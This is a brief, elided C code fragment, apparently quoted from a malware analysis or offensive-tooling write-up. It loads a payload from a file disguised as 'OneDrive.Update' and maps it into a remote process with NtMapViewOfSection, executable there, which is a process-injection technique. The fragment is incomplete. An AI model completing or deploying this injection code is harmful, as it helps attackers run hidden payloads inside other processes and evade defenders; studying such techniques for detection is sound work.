...
void Load() {
  ...
  FILE * pFile = fopen("OneDrive.Update", "rb");
  if(pFile == NULL){
    return;
  }
  ...
  pNtMapViewOfSection(hSec, GetCurrentProcess(), &pLView, NULL, NULL, NULL, &payload_size, ViewUnmap, NULL, PAGE_READWRITE);
  ...
  pNtMapViewOfSection(hSec, hProc, &pRView, NULL, NULL, NULL, &payload_size, ViewUnmap, NULL, PAGE_EXECUTE_READ);
